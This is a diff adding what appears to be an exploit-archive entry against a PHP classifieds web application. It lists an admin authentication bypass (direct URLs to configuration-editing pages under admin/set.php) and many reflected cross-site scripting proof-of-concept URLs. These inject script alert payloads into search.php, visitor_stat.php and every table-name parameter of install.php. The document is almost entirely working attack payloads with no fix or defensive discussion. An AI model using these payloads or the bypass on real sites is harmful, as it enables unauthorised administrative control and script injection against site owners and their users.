@@ -1,0 +1,52 @@
+admin bypass
+
+http://localhost/classifieds/admin   ( admin menu )
+
+http://localhost/classifieds/admin/set.php?file_name=config/general.inc.php  ( general setup )
+
+http://localhost/classifieds/admin/set.php?file_name=config/options.inc.php  ( options )
+
+http://localhost/classifieds/admin/set.php?file_name=config/globaluser.inc.php ( Global user fields  )
+
+http://localhost/classifieds/admin/set.php?file_name=config/credits.inc.php ( credits )
+
+http://localhost/classifieds/admin/set.php?file_name=config/pay.inc.php ( payments )
+
+classified XSS
+
+http://localhost/classifieds/admin/visitor_stat.php?order_by=page&amp;dir=asc&amp;mo=&amp;yr=&quot;&gt;&lt;script&gt;alert(&quot;CANAKKALE-GECiLMEZ&quot;)&lt;/script&gt;
+
+http://localhost/classifieds/search.php?do_search=Search&amp;searchword=&quot;&gt;&lt;script&gt;alert(&quot;CANAKKALE-GECiLMEZ&quot;)&lt;/script&gt;
+
+http://localhost/classifieds/install.php?level=3&amp;q_tbl=&quot;&gt;&lt;script&gt;alert(&quot;CANAKKALE-GECiLMEZ&quot;)&lt;/script&gt;&amp;fav_tbl=favourites&amp;stat_tbl=stat&amp;template_tbl=templ
+ate&amp;adv_tbl=advertisers&amp;banner_tbl=banners&amp;payment_tbl=payment&amp;usr_tbl=user&amp;ads_tbl=ad&amp;cat_tbl=category&amp;pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&amp;q_tbl=questions&amp;fav_tbl=&quot;&gt;&lt;script&gt;alert(&quot;CANAKKALE-GECiLMEZ&quot;)&lt;/script&gt;&amp;stat_tbl=stat&amp;template_tbl=templa
+te&amp;adv_tbl=advertisers&amp;banner_tbl=banners&amp;payment_tbl=payment&amp;usr_tbl=user&amp;ads_tbl=ad&amp;cat_tbl=category&amp;pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&amp;q_tbl=questions&amp;fav_tbl=favourites&amp;stat_tbl=&quot;&gt;&lt;script&gt;alert(&quot;CANAKKALE-GECiLMEZ&quot;)&lt;/script&gt;&amp;template_tbl=
+template&amp;adv_tbl=advertisers&amp;banner_tbl=banners&amp;payment_tbl=payment&amp;usr_tbl=user&amp;ads_tbl=ad&amp;cat_tbl=category&amp;pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&amp;q_tbl=questions&amp;fav_tbl=favourites&amp;stat_tbl=stat&amp;template_tbl=&quot;&gt;&lt;script&gt;alert(&quot;CANAKKALE-GECiLMEZ&quot;)&lt;/scr
+ipt&gt;&amp;adv_tbl=advertisers&amp;banner_tbl=banners&amp;payment_tbl=payment&amp;usr_tbl=user&amp;ads_tbl=ad&amp;cat_tbl=category&amp;pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&amp;q_tbl=questions&amp;fav_tbl=favourites&amp;stat_tbl=stat&amp;template_tbl=template&amp;adv_tbl=&quot;&gt;&lt;script&gt;alert(&quot;CANAKKAL
+E-GECiLMEZ&quot;)&lt;/script&gt;&amp;banner_tbl=banners&amp;payment_tbl=payment&amp;usr_tbl=user&amp;ads_tbl=ad&amp;cat_tbl=category&amp;pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&amp;q_tbl=questions&amp;fav_tbl=favourites&amp;stat_tbl=stat&amp;template_tbl=template&amp;adv_tbl=advertisers&amp;banner_tbl=&quot;&gt;
+&lt;script&gt;alert(&quot;CANAKKALE-GECiLMEZ&quot;)&lt;/script&gt;&amp;payment_tbl=payment&amp;usr_tbl=user&amp;ads_tbl=ad&amp;cat_tbl=category&amp;pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&amp;q_tbl=questions&amp;fav_tbl=favourites&amp;stat_tbl=stat&amp;template_tbl=template&amp;adv_tbl=advertisers&amp;banner_tbl=ba
+nners&amp;payment_tbl=&quot;&gt;&lt;script&gt;alert(&quot;CANAKKALE-GECiLMEZ&quot;)&lt;/script&gt;&amp;usr_tbl=user&amp;ads_tbl=ad&amp;cat_tbl=category&amp;pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&amp;q_tbl=questions&amp;fav_tbl=favourites&amp;stat_tbl=stat&amp;template_tbl=template&amp;adv_tbl=advertisers&amp;banner_tbl=ba
+nners&amp;payment_tbl=payment&amp;usr_tbl=&quot;&gt;&lt;script&gt;alert(&quot;CANAKKALE-GECiLMEZ&quot;)&lt;/script&gt;&amp;ads_tbl=ad&amp;cat_tbl=category&amp;pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&amp;q_tbl=questions&amp;fav_tbl=favourites&amp;stat_tbl=stat&amp;template_tbl=template&amp;adv_tbl=advertisers&amp;banner_tbl=ba
+nners&amp;payment_tbl=payment&amp;usr_tbl=user&amp;ads_tbl=&quot;&gt;&lt;script&gt;alert(&quot;CANAKKALE-GECiLMEZ&quot;)&lt;/script&gt;&amp;cat_tbl=category&amp;pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&amp;q_tbl=questions&amp;fav_tbl=favourites&amp;stat_tbl=stat&amp;template_tbl=template&amp;adv_tbl=advertisers&amp;banner_tbl=ba
+nners&amp;payment_tbl=payment&amp;usr_tbl=user&amp;ads_tbl=ad&amp;cat_tbl=&quot;&gt;&lt;script&gt;alert(&quot;CANAKKALE-GECiLMEZ&quot;)&lt;/script&gt;&amp;pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&amp;q_tbl=questions&amp;fav_tbl=favourites&amp;stat_tbl=stat&amp;template_tbl=template&amp;adv_tbl=advertisers&amp;banner_tbl=ba
+nners&amp;payment_tbl=payment&amp;usr_tbl=user&amp;ads_tbl=ad&amp;cat_tbl=category&amp;pic_tbl=&quot;&gt;&lt;script&gt;alert(&quot;CANAKKALE-GECiLMEZ&quot;)&lt;/script&gt;
